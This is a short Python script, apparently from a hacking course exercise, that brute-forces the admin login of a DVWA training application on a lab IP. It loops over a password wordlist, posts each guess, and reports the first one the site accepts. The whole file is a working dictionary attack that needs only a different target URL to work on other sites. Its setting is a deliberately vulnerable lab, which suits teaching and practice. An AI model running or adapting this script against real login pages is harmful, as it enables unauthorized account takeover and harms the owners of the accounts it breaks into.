#!/usr/bin/env python

import requests

target_url = "http://10.0.2.10/dvwa/login.php"
data_dict = {"username": "admin", "password": "", "Login": "submit"}

with open("18. Writing a Program to Guess Login Information/passwords.txt", "r") as wordlist_file:
    for line in wordlist_file:
        word = line.strip()
        data_dict["password"] = word
        response = requests.post(target_url, data = data_dict)
        if "Login failed" not in str(response.content):
            print("[+] Found the password --> " + word)
            exit()

print("[+] Reached end of line. Try another wordlist")
